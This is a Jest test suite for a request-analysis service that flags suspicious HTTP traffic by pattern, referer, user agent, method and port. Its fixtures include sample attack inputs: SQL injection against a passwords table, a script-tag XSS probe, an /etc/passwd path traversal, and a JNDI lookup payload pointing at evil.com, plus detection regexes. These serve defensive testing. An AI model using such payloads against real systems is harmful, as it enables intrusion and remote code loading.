/**
 * Test suite for PatternAnalysisService
 */

const PatternAnalysisService = require('../PatternAnalysisService');
const crypto = require('crypto');

// Mock ConfigService
jest.mock('../../services/ConfigService', () => ({
    findByCategory: jest.fn().mockResolvedValue([])
}));

// Mock geoip-lite
jest.mock('geoip-lite', () => ({
    lookup: jest.fn((ip) => {
        if (ip === '8.8.8.8') {
            return {
                country: 'US',
                city: 'Mountain View',
                ll: [37.386, -122.0838]
            };
        }
        return null;
    })
}));

describe('PatternAnalysisService', () => {
    let service;

    beforeEach(async () => {
        // Crea nuova istanza per ogni test
        service = new PatternAnalysisService({ geoEnabled: true });

        // Aspetta inizializzazione da DB (mockato)
        await service.initialized;

        // Setup pattern di test manualmente (dato che DB è mockato)
        service.suspiciousPatterns = [
            /(\bunion\b|\bselect\b|\binsert\b)/i,  // SQL injection
            /(<script|javascript:|onerror=)/i,     // XSS
            /(\.\.\/|\.\.\\)/                      // Path traversal
        ];

        service.botPatterns = [
            /bot|crawler|spider/i
        ];

        service.suspiciousReferers = [
            /malicious\.com/i
        ];

        service.suspiciousScores = {
            ALT_PORT: 10,
            URL_PATTERN: 10,
            BODY_PATTERN: 10,
            MISSING_USER_AGENT: 5,
            SHORT_USER_AGENT: 3,
            SUSPICIOUS_REFERER: 8,
            BOT_USER_AGENT: 2,
            UNCOMMON_METHOD: 5
        };
    });

    describe('generateFingerprint', () => {
        test('should generate consistent hash for same input', () => {
            const mockReq = {
                get: jest.fn((header) => {
                    const headers = {
                        'User-Agent': 'Mozilla/5.0',
                        'Accept-Language': 'en-US',
                        'Accept-Encoding': 'gzip'
                    };
                    return headers[header];
                })
            };

            const ip = '192.168.1.100';
            const hash1 = service.generateFingerprint(mockReq, ip);
            const hash2 = service.generateFingerprint(mockReq, ip);

            expect(hash1).toBe(hash2);
            expect(hash1).toHaveLength(32); // MD5 hash length
        });

        test('should generate different hash for different IP', () => {
            const mockReq = {
                get: jest.fn().mockReturnValue('Mozilla/5.0')
            };

            const hash1 = service.generateFingerprint(mockReq, '192.168.1.1');
            const hash2 = service.generateFingerprint(mockReq, '192.168.1.2');

            expect(hash1).not.toBe(hash2);
        });

        test('should generate different hash for different User-Agent', () => {
            const ip = '192.168.1.100';

            const mockReq1 = {
                get: jest.fn().mockReturnValue('Mozilla/5.0')
            };

            const mockReq2 = {
                get: jest.fn().mockReturnValue('Chrome/91.0')
            };

            const hash1 = service.generateFingerprint(mockReq1, ip);
            const hash2 = service.generateFingerprint(mockReq2, ip);

            expect(hash1).not.toBe(hash2);
        });
    });

    describe('analyze', () => {
        const createMockRequest = (overrides = {}) => ({
            headers: {},
            ...overrides
        });

        test('should detect SQL injection in URL', () => {
            const result = service.analyze(
                '/api/users?id=1 UNION SELECT * FROM passwords',
                'Mozilla/5.0',
                '',
                '',
                'GET',
                '',
                createMockRequest(),
                null
            );

            expect(result.suspicious).toBe(true);
            expect(result.score).toBeGreaterThan(0);
            // Pattern format senza flags regex nella stringa
            expect(result.indicators.some(i => i.includes('URL_PATTERN'))).toBe(true);
        });

        test('should detect XSS in URL', () => {
            const result = service.analyze(
                '/search?q=<script>alert(1)</script>',
                'Mozilla/5.0',
                '',
                '',
                'GET',
                '',
                createMockRequest(),
                null
            );

            expect(result.suspicious).toBe(true);
            expect(result.indicators.some(i => i.includes('URL_PATTERN'))).toBe(true);
        });

        test('should detect path traversal', () => {
            const result = service.analyze(
                '/../../etc/passwd',
                'Mozilla/5.0',
                '',
                '',
                'GET',
                '',
                createMockRequest(),
                null
            );

            expect(result.suspicious).toBe(true);
            expect(result.score).toBeGreaterThan(0);
        });

        test('should detect suspicious patterns in body', () => {
            const result = service.analyze(
                '/api/login',
                'Mozilla/5.0',
                'SELECT * FROM users',  // Pattern SQL più chiaro
                '',
                'POST',
                '',
                createMockRequest(),
                null
            );

            expect(result.suspicious).toBe(true);
            expect(result.indicators.some(i => i.includes('BODY_PATTERN'))).toBe(true);
        });

        test('should detect missing User-Agent', () => {
            const result = service.analyze(
                '/api/test',
                null,
                '',
                '',
                'GET',
                '',
                createMockRequest(),
                null
            );

            expect(result.suspicious).toBe(true);
            expect(result.indicators).toContain('MISSING_USER_AGENT');
            expect(result.score).toBeGreaterThanOrEqual(5);
        });

        test('should detect short User-Agent', () => {
            const result = service.analyze(
                '/api/test',
                'curl',
                '',
                '',
                'GET',
                '',
                createMockRequest(),
                null
            );

            expect(result.suspicious).toBe(true);
            expect(result.indicators).toContain('SHORT_USER_AGENT');
        });

        test('should detect bot User-Agent', () => {
            const result = service.analyze(
                '/api/test',
                'Googlebot/2.1',
                '',
                '',
                'GET',
                '',
                createMockRequest(),
                null
            );

            expect(result.suspicious).toBe(true);
            expect(result.isBot).toBe(true);
            expect(result.indicators.some(i => i.startsWith('BOT_USER_AGENT'))).toBe(true);
        });

        test('should detect suspicious referer', () => {
            const result = service.analyze(
                '/api/test',
                'Mozilla/5.0',
                '',
                'http://malicious.com',
                'GET',
                '',
                createMockRequest(),
                null
            );

            expect(result.suspicious).toBe(true);
            expect(result.indicators.some(i => i.includes('SUSPICIOUS_REFERER'))).toBe(true);
        });

        test('should detect JNDI payload', () => {
            const jndiPayload = '${jndi:ldap://evil.com/a}';

            const result = service.analyze(
                '/api/test',
                'Mozilla/5.0',
                '',
                '',
                'GET',
                '',
                createMockRequest(),
                jndiPayload
            );

            expect(result.suspicious).toBe(true);
            expect(result.score).toBeGreaterThan(15); // JNDI ha score alto
            expect(result.indicators.some(i => i.includes('JNDI_PAYLOAD'))).toBe(true);
        });

        test('should detect uncommon HTTP method', () => {
            const result = service.analyze(
                '/api/test',
                'Mozilla/5.0',
                '',
                '',
                'DELETE',
                '',
                createMockRequest(),
                null
            );

            expect(result.suspicious).toBe(true);
            expect(result.indicators).toContain('UNCOMMON_METHOD');
        });

        test('should detect ALT_PORT header', () => {
            const result = service.analyze(
                '/api/test',
                'Mozilla/5.0',
                '',
                '',
                'GET',
                '',
                createMockRequest({ headers: { 'x-server-port': '8080' } }),
                null
            );

            expect(result.suspicious).toBe(true);
            expect(result.indicators).toContain('ALT_PORT:8080');
            expect(result.score).toBeGreaterThanOrEqual(10);
        });

        test('should return clean result for normal request', () => {
            const result = service.analyze(
                '/api/users',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                '',
                '',
                'GET',
                '',
                createMockRequest(),
                null
            );

            expect(result.suspicious).toBe(false);
            expect(result.score).toBe(0);
            expect(result.indicators).toHaveLength(0);
            expect(result.isBot).toBe(false);
        });

        test('should accumulate multiple indicators', () => {
            const result = service.analyze(
                '/api/users?id=1 UNION SELECT',
                '',
                '<script>alert(1)</script>',
                'http://malicious.com',
                'DELETE',
                '',
                createMockRequest({ headers: { 'x-server-port': '8080' } }),
                null
            );

            expect(result.suspicious).toBe(true);
            expect(result.indicators.length).toBeGreaterThan(3);
            expect(result.score).toBeGreaterThan(30);
        });
    });

    describe('getGeoLocation', () => {
        test('should return geo data for known IP', () => {
            const result = service.getGeoLocation('8.8.8.8');

            expect(result).toBeDefined();
            expect(result.country).toBe('US');
            expect(result.city).toBe('Mountain View');
            expect(result.coordinates).toBeDefined();
            expect(result.coordinates).toEqual([37.386, -122.0838]);
        });

        test('should return empty object for unknown IP', () => {
            const result = service.getGeoLocation('0.0.0.0');

            expect(result).toEqual({});
        });

        test('should return empty object for localhost', () => {
            const result = service.getGeoLocation('127.0.0.1');

            expect(result).toEqual({});
        });

        test('should return empty object when geo disabled', () => {
            const serviceNoGeo = new PatternAnalysisService({ geoEnabled: false });

            const result = serviceNoGeo.getGeoLocation('8.8.8.8');

            expect(result).toEqual({});
        });
    });

    describe('applyAnalysis', () => {
        test('should perform complete analysis on request', async () => {
            const mockReq = {
                method: 'POST',
                originalUrl: '/api/login',
                url: '/api/login',
                body: { username: 'admin' },
                query: {},
                get: jest.fn((header) => {
                    const headers = {
                        'User-Agent': 'Mozilla/5.0',
                        'Referer': 'http://example.com'
                    };
                    return headers[header];
                }),
                headers: {}
            };

            const ip = '8.8.8.8';

            const result = await service.applyAnalysis(mockReq, ip);

            expect(result).toHaveProperty('fingerprint');
            expect(result).toHaveProperty('analysis');
            expect(result).toHaveProperty('geo');

            expect(result.fingerprint).toHaveLength(32); // MD5 hash
            expect(result.analysis).toHaveProperty('suspicious');
            expect(result.analysis).toHaveProperty('score');
            expect(result.analysis).toHaveProperty('indicators');
            expect(result.geo).toHaveProperty('country', 'US');
        });
    });
});
